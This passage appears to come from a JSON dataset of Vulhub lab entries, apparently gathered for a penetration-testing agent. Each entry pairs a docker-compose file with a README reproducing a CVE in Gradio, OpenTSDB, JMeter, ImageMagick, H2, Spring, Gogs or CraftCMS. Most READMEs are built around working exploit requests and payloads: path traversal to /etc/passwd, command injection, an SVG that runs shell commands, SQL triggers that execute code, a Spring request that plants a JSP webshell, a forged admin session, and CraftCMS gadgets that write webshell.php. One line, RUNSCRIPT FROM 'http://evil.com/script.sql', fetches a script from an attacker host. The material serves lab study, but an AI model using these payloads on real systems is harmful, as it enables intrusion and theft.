file and obtain an accessible file path.\n\n```\nPOST /upload HTTP/1.1\nHost: localhost:7860\nContent-Type: multipart/form-data; boundary=---------------------------250033711231076532771336998311\n\n-----------------------------250033711231076532771336998311\nContent-Disposition: form-data; name=\"files\";filename=\"okmijnuhbygv\"\nContent-Type: application/octet-stream\n\n123456\n-----------------------------250033711231076532771336998311--\n\n```\n\n![](1.png)\n\nOnce you have an accessible file path, use the `/file` interface with directory traversal to read arbitrary files from the server, such as `/etc/passwd`:\n\n```\nGET /file=/tmp/gradio/7c4a8d09ca3762af61e59520943dc26494f8941b/../../../../../../../../../../../../../../../etc/passwd HTTP/1.1\nHost: localhost:7860\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36 Edg/100.0.1185.36\nConnection: close\nAccept-Encoding: gzip\n\n```\n\n![](2.png)\n"
  },
  {
    "filename": "CVE-2023-25826.md",
    "filenamenomd": "CVE-2023-25826",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/opentsdb/CVE-2023-25826/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/opentsdb/CVE-2023-25826/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 94 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n opentsdb:\n   image: vulhub/opentsdb:2.4.1\n   ports:\n    - \"4242:4242\"\n\n```\n\n",
    "readme": "# OpenTSDB Arbitrary Command Injection Remote Code Execution（CVE-2023-25826）\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nOpenTSDB is a distributed, scalable Time Series Database (TSDB) written on top of HBase.\nIn version 2.4.1 and earlier, there is a command injection vulnerability. This vulnerability is actually due to an incomplete fix for CVE-2020-35476, so the entire reproduction process is similar to the previous one.\n\nReferences:\n\n- https://www.synopsys.com/blogs/software-security/opentsdb/\n- https://github.com/OpenTSDB/opentsdb/pull/2275\n\n## Environment\n\nExecute the following command to start a OpenTSDB server 2.4.1:\n\n```\ndocker-compose up -d\n```\n\nOnce the service is started, visit `http://your-ip:4242` to see the web interface of the OpenTSDB.\n\n## Exploit\n\nSimialar as CVE-2020-35476, you need to know the name of a metric, visit `http://your-ip:4242/api/suggest?type=metrics&q=&max=10`to find out the metric list.\n\nDue to the `tsd.core.auto_create_metrics` is set to `true` in this vulnerable OpenTSDB, you can create a metric named `sys.cpu.nice` through following request, if the metrics are empty:\n\n```\nPOST /api/put/ HTTP/1.1\nHost: your-ip:4242\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36\nContent-Type: application/x-www-form-urlencoded\nConnection: close\nContent-Length: 150\n\n{\n    \"metric\": \"sys.cpu.nice\",\n    \"timestamp\": 1346846400,\n    \"value\": 20,\n    \"tags\": {\n       \"host\": \"web01\",\n       \"dc\": \"lga\"\n    }\n}\n```\n\nIf at least one metric exists and is not empty, the above request is not required.\n\nThen the POC is different here, with the difference in the \"key\" parameter.\n\n```\nGET /q?start=2000/10/21-00:00:00&m=sum:sys.cpu.nice&o=&ylabel=1&xrange=&y2range=[42:42]&key=%3Bsystem%20%22touch%20/tmp/poc%22%20%22&wxh=1516x644&style=linespoint&baba=lala&grid=t&json HTTP/1.1\nHost: your-ip:4242\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36\nConnection: close\n\n\n```\n\n![](1.png)\n\n`touch /tmp/poc` has been successfully executed:\n\n![](2.png)\n"
  },
  {
    "filename": "CVE-2018-1297.md",
    "filenamenomd": "CVE-2018-1297",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/jmeter/CVE-2018-1297/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/jmeter/CVE-2018-1297/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 87 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n jmeter:\n   image: vulhub/jmeter:3.3\n   ports:\n    - \"1099:1099\"\n```\n\n",
    "readme": "# Apache JMeter RMI Deserialization Remote Code Execution (CVE-2018-1297)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nApache JMeter is an Apache project that can be used as a load testing tool for analyzing and measuring the performance of a variety of services, with a focus on web applications.\n\nWhen using Distributed Test only (RMI based), Apache JMeter 2.x and 3.x uses an unsecured RMI connection. This could allow an attacker to get Access to JMeterEngine and send unauthorized code.\n\n## Vulnerable environment\n\nExecute following command to start a JMeter v3.3 RMI server:\n\n```\ndocker compose up -d\n```\n\nAfter the server is started, the RMI is listening on port 1099.\n\n## Exploit\n\nUse [ysoserial](https://github.com/frohoff/ysoserial) to exploit the deserialization by the gadget `BeanShell1`:\n\n```\njava -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit your-ip 1099 BeanShell1 'touch /tmp/success'\n```\n\nExecute `docker compose exec jmeter bash` to enter the container, you will see the `/tmp/success` has been created:\n\n![](1.png)\n\nGet a reverse shell:\n\n![](2.png)\n"
  },
  {
    "filename": "CVE-2020-29599.md",
    "filenamenomd": "CVE-2020-29599",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/imagemagick/CVE-2020-29599/docker-compose.yml\n- /home/yay/pentest-agent/vulhub/sites_no_md/imagemagick/CVE-2020-29599/poc.svg\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/imagemagick/CVE-2020-29599/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 108 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 18:41:15\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n im:\n   image: vulhub/imagemagick:7.0.10-36\n   volumes:\n    - ./poc.svg:/tmp/poc.svg\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/imagemagick/CVE-2020-29599/poc.svg\n\n- Extension: .svg\n- Language: unknown\n- Size: 398 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```unknown\n<image authenticate='ff\" `echo $(id)> ./0wned`;\"'>\n  <read filename=\"pdf:/etc/passwd\"/>\n  <get width=\"base-width\" height=\"base-height\" />\n  <resize geometry=\"400x400\" />\n  <write filename=\"test.png\" />\n  <svg width=\"700\" height=\"700\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">       \n  <image xlink:href=\"msl:poc.svg\" height=\"100\" width=\"100\"/>\n  </svg>\n</image>\n```\n\n",
    "readme": "# ImageMagick Shell Injection via PDF Password (CVE-2020-29599)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nImageMagick is a free and open-source cross-platform software suite for displaying, creating, converting, modifying, and editing raster images.\n\nReferences:\n\n- https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html\n\n## Environment Setup and Exploit\n\nExecute the following command to enter the Linux shell where Imagemagick 7.0.10-36 is installed:\n\n```\ndocker compose run im bash\n```\n\nEnter the `/tmp` directory and convert the format of [poc.svg](poc.svg) to trigger the vulnerability:\n\n```\nroot@f200ec9e1c1e:/# cd /tmp/\nroot@f200ec9e1c1e:/tmp# ls\npoc.svg\nroot@f200ec9e1c1e:/tmp# identify poc.svg\npoc.svg SVG 700x700 700x700+0+0 16-bit sRGB 398B 0.000u 0:00.003\nroot@f200ec9e1c1e:/tmp# convert poc.svg poc.png\nsh: 1: : Permission denied\nconvert: MagickCore/image.c:1168: DestroyImage: Assertion `image != (Image *) NULL' failed.\nAborted\nroot@f200ec9e1c1e:/tmp# ls\n0wned  poc.svg\nroot@f200ec9e1c1e:/tmp#\n```\n\nThe command `echo $(id)> ./0wned` has been executed successfully:\n\n![](1.png)\n"
  },
  {
    "filename": "CVE-2018-10054.md",
    "filenamenomd": "CVE-2018-10054",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/h2database/CVE-2018-10054/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/h2database/CVE-2018-10054/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 117 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nservices:\n  web:\n    image: vulhub/spring-with-h2database:1.4.197\n    ports:\n      - \"8080:8080\"\n      - \"5005:5005\"\n\n```\n\n",
    "readme": "# H2 Database Web Console Authentication Remote Code Execution (CVE-2018-10054)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nH2 database is a fast, open-source Java-based relational database management system (RDBMS) that can be used in both embedded (within a Java application) and client-server modes.\n\nSpringboot with h2 database comes with a web management page if you set the following options:\n\n```\nspring.h2.console.enabled=true\nspring.h2.console.settings.web-allow-others=true\n```\n\nH2 Database versions prior to 1.4.198 allow any user to access the web management page by creating a new database file or connecting to an in-memory database. After authentication, an arbitrary code can be executed by one of the following commands:\n\n- `RUNSCRIPT FROM 'http://evil.com/script.sql'`\n- `CREATE ALIAS func AS code...; CALL func ...`\n- `CREATE TRIGGER ... AS code...`\n\nReferences:\n\n- <https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html>\n- <https://www.exploit-db.com/exploits/45506>\n- <https://github.com/h2database/h2database/issues/1225>\n- <https://github.com/h2database/h2database/pull/1580>\n- <https://github.com/h2database/h2database/pull/1726>\n\n## Setup\n\nStart a spring-boot with h2 database 1.4.197:\n\n```\ndocker compose up -d\n```\n\nAfter started the container, the spring-boot is listening on `http://your-ip:8080`, the management page is `http://your-ip:8080/h2-console/` by default.\n\n## Vulnerability Reproduce\n\nFirst, login the H2 web console by connecting to the in-memory database:\n\n```\njdbc:h2:mem:test\n```\n\n![](1.png)\n\nThen, execute the following commands to execute the `id` command:\n\n```sql\nCREATE TRIGGER shell3 BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\n    var is = java.lang.Runtime.getRuntime().exec(\"id\").getInputStream()\n    var scanner = new java.util.Scanner(is).useDelimiter(\"\\\\A\")\n    throw new java.lang.Exception(scanner.next())\n$$;\n```\n\nAs you can see, the `id` command is executed successfully and the result is raised as an exception.\n\n![](2.png)\n"
  },
  {
    "filename": "CVE-2022-22965.md",
    "filenamenomd": "CVE-2022-22965",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/spring/CVE-2022-22965/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/spring/CVE-2022-22965/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 85 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nservices:\n spring:\n   image: vulhub/spring-webmvc:5.3.17\n   ports:\n    - \"8080:8080\"\n\n```\n\n",
    "readme": "# Spring Framework Data Binding Remote Code Execution on JDK 9+ (CVE-2022-22965)\n\nA Spring MVC or Spring WebFlux application running on JDK 9+ may be vulnerable to remote code execution (RCE) via data binding. The specific exploit requires the application to run on Tomcat as a WAR deployment. If the application is deployed as a Spring Boot executable jar, i.e. the default, it is not vulnerable to the exploit. However, the nature of the vulnerability is more general, and there may be other ways to exploit it.\n\nReferences:\n\n- <https://tanzu.vmware.com/security/cve-2022-22965>\n- <https://www.lunasec.io/docs/blog/spring-rce-vulnerabilities/>\n\n## Vulnerability Environment\n\nExecute the following command to start a server that uses Spring WebMVC 5.3.17:\n\n```\ndocker compose up -d\n```\n\nAfter server is started, browse the `http://your-ip:8080/?name=Bob&age=25` to see an example page.\n\n## Vulnerability Reproduce\n\nSend the following request to change the logging configuration in Apache Tomcat and write the log as a JSP file:\n\n```\nGET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= HTTP/1.1\nHost: localhost:8080\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36\nConnection: close\nsuffix: %>//\nc1: Runtime\nc2: <%\nDNT: 1\n\n\n```\n\n![](1.png)\n\nThen, you can use the JSP webshell to execute arbitrary commands successfully:\n\n```\nhttp://localhost:8080/tomcatwar.jsp?pwd=j&cmd=id\n```\n\n![](2.png)\n\nNoted that you should clear the `class.module.classLoader.resources.context.parent.pipeline.first.pattern` if you don't want the JSP webshell to be large, because every request logging will be written into that file. Send following request to clear the attribute:\n\n```\nGET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern= HTTP/1.1\nHost: localhost:8080\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36\nConnection: close\n\n\n```\n"
  },
  {
    "filename": "CVE-2018-18925.md",
    "filenamenomd": "CVE-2018-18925",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/gogs/CVE-2018-18925/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/gogs/CVE-2018-18925/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 104 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n web:\n   image: vulhub/gogs:0.11.66\n   ports:\n    - \"10022:22\"\n    - \"3000:3000\"\n\n```\n\n",
    "readme": "# Gogs Session Overwrite and Arbitrary User Forge (CVE-2018-18925)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nGogs is a painless self-hosted Git service.\n\nGogs 0.11.66 allows remote code execution because it does not properly validate session IDs, as demonstrated by a `..` session-file forgery in the file session provider in file.go. This is related to session ID handling in the go-macaron/session code for Macaron.\n\nReferences:\n\n- <https://github.com/gogs/gogs/issues/5469>\n- <https://xz.aliyun.com/t/3168>\n- <https://www.anquanke.com/post/id/163575>\n\n## Vulnerable environment\n\nExecute following command to start a Gogs server 0.11.66:\n\n```\ndocker compose up -d\n```\n\nAfter the server is started, you can see the installation page on `http://your-ip:3000`. Follow the instructions to initialize the application, keep in mind that use SQLite as the database provider and enable the user register.\n\nRestart the server by `docker compose restart` after the installation, otherwise the session won't be stored in the filesystem.\n\n## Exploit\n\nBefore the exploit, use Gob to generate a evil session file:\n\n```go\npackage main\n\nimport (\n    \"bytes\"\n    \"encoding/gob\"\n    \"encoding/hex\"\n    \"fmt\"\n    \"io/ioutil\"\n    \"os\"\n)\n\nfunc EncodeGob(obj map[interface{}]interface{}) ([]byte, error) {\n    for _, v := range obj {\n        gob.Register(v)\n    }\n    buf := bytes.NewBuffer(nil)\n    err := gob.NewEncoder(buf).Encode(obj)\n    return buf.Bytes(), err\n}\n\nfunc main() {\n    var uid int64 = 1\n    obj := map[interface{}]interface{}{\"_old_uid\": \"1\", \"uid\": uid, \"uname\": \"root\"}\n    data, err := EncodeGob(obj)\n    if err != nil {\n        fmt.Println(err)\n    }\n    err = ioutil.WriteFile(\"data\", data, os.O_CREATE|os.O_WRONLY)\n    if err != nil {\n        fmt.Println(err)\n    }\n    edata := hex.EncodeToString(data)\n    fmt.Println(edata)\n}\n```\n\nSign up a normal user account, then create a project and upload the generated evil file on release page:\n\n![](1.png)\n\nGet the aboslute file path from the attachment URL, for example `./attachments/2eb7f1a2-b5ec-482e-a297-15b625d24a10`.\n\nFinally, construct a malicious session id like `i_like_gogits=../attachments/2/e/2eb7f1a2-b5ec-482e-a297-15b625d24a10` and you can see that you are administrator (uid=1) now:\n\n![](2.png)\n\nTo execte commands as the administrator role, please refer to the reference links.\n"
  },
  {
    "filename": "CVE-2023-41892.md",
    "filenamenomd": "CVE-2023-41892",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/craftcms/CVE-2023-41892/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/craftcms/CVE-2023-41892/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 202 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nservices:\n web:\n   image: vulhub/craftcms:4.4.14\n   depends_on:\n    - db\n   ports:\n    - \"8088:80\"\n db:\n   image: mysql:5.7\n   environment: \n    - MYSQL_ROOT_PASSWORD=root\n    - MYSQL_DATABASE=craftcms\n\n```\n\n",
    "readme": "# CraftCMS ConditionsController Pre-Auth Remote Code Execution (CVE-2023-41892)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nCraft CMS is a flexible, user-friendly CMS for creating custom digital experiences on the web. It provides users with a backend interface to implement websites and configure the CMS.\n\nA vulnerability in Craft CMS versions 4.4.0 through 4.4.14 allows unauthenticated attackers to achieve remote code execution through the `ConditionsController`. The vulnerability exists due to insufficient input validation in the controller's `beforeAction` method, which can be exploited to create arbitrary objects and achieve code execution.\n\nReferences:\n\n- <https://github.com/craftcms/cms/security/advisories/GHSA-4w8r-3xrw-v25g>\n- <https://blog.calif.io/p/craftcms-rce>\n- <https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/>\n\n## Environment Setup\n\nExecute the following command to start a vulnerable Craft CMS 4.4.14:\n\n```\ndocker compose up -d\n```\n\nAfter the server is running, you can see the installation page at `http://your-ip:8088/admin/install`. Please follow the instructions to install CraftCMS, the default database address is `db` and the username and password are both `root`.\n\n![](1.png)\n\n## Vulnerability Reproduction\n\nThe root cause of the vulnerability is that the attacker can send a specially crafted HTTP request to create arbitrary objects through PHP object injection. By chaining multiple gadgets in the codebase, the attacker can achieve remote code execution.\n\nThere are two common gadgets that can be used to achieve remote code execution.\n\n### Gadget 1: `craft\\elements\\conditions\\users\\UserCondition` with `\\Psy\\Configuration`\n\nThis gadget requires server logging to be enabled, which is enabled by default.\n\nFirst, send a POST request with a syntax error JSON to write the payload to the log file:\n\n```\nPOST /index.php?action=conditions/render HTTP/1.1\nHost: localhost:8088\nContent-Type: application/json\n\n{\naaaaaaaaaaaaaaaaaaaaa\naaaaaaaaaaaaaaaaaaaaaa\naaaaaaaaaaaaaaaaaaaaa\n<?php\n@phpinfo(); __halt_compiler();\n?>\n}\n```\n\n![](2.png)\n\nThen, trigger the remote code execution by including the log file through the `\\Psy\\Configuration` gadget (replace the `2025-03-31` with your current date):\n\n```\nPOST /index.php?action=conditions/render HTTP/1.1\nHost: localhost:8088\nContent-Type: application/json\n\n{\n  \"config\": {\n    \"name\": \"test\",\n    \"as xyz\": {\n      \"class\": \"\\\\Psy\\\\Configuration\",\n      \"__construct()\": {\n        \"config\": {\n          \"configFile\": \"../storage/logs/web-2025-03-31.log\"\n        }\n      }\n    }\n  },\n  \"test\": \"craft\\\\elements\\\\conditions\\\\users\\\\UserCondition\"\n}\n```\n\n![](3.png)\n\nAs you can see, the PHPINFO is executed successfully.\n\n### Gadget 2: `craft\\elements\\conditions\\users\\UserCondition` with built-in `Imagick` class\n\nIf the Imagick extension is enabled, you can use the `Imagick` class with MSL format to write arbitrary files:\n\n```\nPOST /index.php?action=conditions/render HTTP/1.1\nHost: localhost:8088\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundarytlNPtAxuuGOeUqqY\n\n------WebKitFormBoundarytlNPtAxuuGOeUqqY\nContent-Disposition: form-data; name=\"test\"\n\ncraft\\elements\\conditions\\users\\UserCondition\n------WebKitFormBoundarytlNPtAxuuGOeUqqY\nContent-Disposition: form-data; name=\"config[name]\"\n\ntest\n------WebKitFormBoundarytlNPtAxuuGOeUqqY\nContent-Disposition: form-data; name=\"config[as xyz][class]\"\n\nimagick\n------WebKitFormBoundarytlNPtAxuuGOeUqqY\nContent-Disposition: form-data; name=\"config[as xyz][__construct()][0][0]\"\n\nvid:msl:/tmp/php*\n------WebKitFormBoundarytlNPtAxuuGOeUqqY\nContent-Disposition: form-data; name=\"file\"; filename=\"1.msl\"\nContent-Type: text/plain\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<image>\n  <read filename=\"caption:&lt;?=phpinfo();?&gt;\"/>\n  <write filename=\"info:webshell.php\" />\n</image>\n------WebKitFormBoundarytlNPtAxuuGOeUqqY--\n```\n\nThis payload will execute PHP code like `new Imagick('vid:msl:/tmp/php*');`, and cause the \"Segmentation fault\" error, which makes the thread crash:\n\n![](4.png)\n\nBut the `webshell.php` file is written successfully:\n\n![](5.png)\n"
  }
]